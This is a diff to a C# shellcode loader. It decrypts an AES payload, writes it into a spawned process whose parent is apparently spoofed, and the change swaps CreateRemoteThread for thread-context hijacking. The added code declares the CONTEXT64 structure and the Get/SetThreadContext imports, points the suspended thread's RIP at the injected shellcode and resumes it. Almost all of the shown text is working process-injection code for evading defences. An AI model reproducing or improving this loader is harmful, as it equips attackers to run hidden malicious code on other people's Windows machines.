@@ -1,4 +1,4 @@
-﻿using System.Diagnostics;
+using System.Diagnostics;
 using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Text.Json;
@@ -138,7 +138,90 @@ namespace sharp
 
         [DllImport("kernel32.dll", SetLastError = true)]
          public static extern bool ResumeThread(IntPtr hThread);
-        
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct M128A
+        {
+            public ulong Low;
+            public long High;
+        }
+
+
+        [StructLayout(LayoutKind.Sequential, Pack = 16)]
+        public struct CONTEXT64
+        {
+           
+            public ulong P1Home;
+            public ulong P2Home;
+            public ulong P3Home;
+            public ulong P4Home;
+            public ulong P5Home;
+            public ulong P6Home;
+
+
+            public uint ContextFlags;
+            public uint MxCsr;
+
+            public ushort SegCs;
+            public ushort SegDs;
+            public ushort SegEs;
+            public ushort SegFs;
+            public ushort SegGs;
+            public ushort SegSs;
+            public uint EFlags;
+
+            public ulong Dr0;
+            public ulong Dr1;
+            public ulong Dr2;
+            public ulong Dr3;
+            public ulong Dr6;
+            public ulong Dr7;
+
+            public ulong Rax;
+            public ulong Rcx;
+            public ulong Rdx;
+            public ulong Rbx;
+            public ulong Rsp;
+            public ulong Rbp;
+            public ulong Rsi;
+            public ulong Rdi;
+            public ulong R8;
+            public ulong R9;
+            public ulong R10;
+            public ulong R11;
+            public ulong R12;
+            public ulong R13;
+            public ulong R14;
+            public ulong R15;
+
+            public ulong Rip;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+            public byte[] FltSave;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
+            public M128A[] VectorRegister;
+            public ulong VectorControl;
+            public ulong DebugControl;
+            public ulong LastBranchToRip;
+            public ulong LastBranchFromRip;
+            public ulong LastExceptionToRip;
+            public ulong LastExceptionFromRip;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool GetThreadContext(
+            IntPtr hThread,
+            ref CONTEXT64 lpContext
+            );
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool SetThreadContext(
+            IntPtr hThread, 
+            ref CONTEXT64 lpContext
+            );
+
         public static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
         {
             using (Aes aes = Aes.Create())
@@ -171,6 +254,7 @@ namespace sharp
 
             IntPtr lpSize = IntPtr.Zero;
             InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+
             IntPtr attributeList = Marshal.AllocHGlobal(lpSize);
             InitializeProcThreadAttributeList(attributeList, 1, 0, ref lpSize);
 
@@ -206,32 +290,50 @@ namespace sharp
                     WriteProcessMemory(pi.hProcess, remoteMem, payload, payload.Length, out bytesWritten);
 
                     // 5. Starting the thread
-                    uint threadId;
-                    IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, out threadId);
-
-                    if (hThread != IntPtr.Zero)
+                    CONTEXT64 cONTEXT64 = new CONTEXT64();
+                    cONTEXT64.ContextFlags = 0x100001;
+                    bool successThread = GetThreadContext(pi.hThread, ref cONTEXT64);
+                    if (successThread)
                     {
-                        Console.WriteLine($"[+] Shellcode injected and running! Thread ID: {threadId}");
-                        CloseHandle(hThread);
+                        Console.WriteLine("[+] Thread context retrieved successfully.");
                     }
+                    else
+                    {
+                        Console.WriteLine("[-] Failed to get thread context: " + Marshal.GetLastWin32Error());
+                    }
+
+                    Console.WriteLine($"[+] Original RIP: 0x{cONTEXT64.Rip:X}");
+                    Console.WriteLine($"[+] New RIP (Shellcode): 0x{(ulong)remoteMem.ToInt64():X}");
+                    cONTEXT64.Rip = (ulong)remoteMem.ToInt64();
+                    bool successSetContext = SetThreadContext(pi.hThread, ref cONTEXT64);
+
+                    if (successSetContext)
+                    {
+                        Console.WriteLine("[+] Thread context set successfully.");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Failed to set thread context: " + Marshal.GetLastWin32Error());
+                    }
+
+                    ResumeThread(pi.hThread);
+                    // Clean up handles
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
                 }
-                ResumeThread(pi.hThread);
-                // Clean up handles
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            }
-            else
-            {
-                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
-            }
+                else
+                {
+                    Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
+                }
 
-            // --- FINAL ATTRIBUTE CLEANUP ---
-            DeleteProcThreadAttributeList(attributeList);
-            Marshal.FreeHGlobal(attributeList);
-            CloseHandle(hParent);
+                // --- FINAL ATTRIBUTE CLEANUP ---
+                DeleteProcThreadAttributeList(attributeList);
+                Marshal.FreeHGlobal(attributeList);
+                CloseHandle(hParent);
 
-            Console.WriteLine("Done. Press any key...");
-            Console.ReadKey();
+                Console.WriteLine("Done. Press any key...");
+                Console.ReadKey();
+            }
         }
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool CloseHandle(IntPtr hObject);
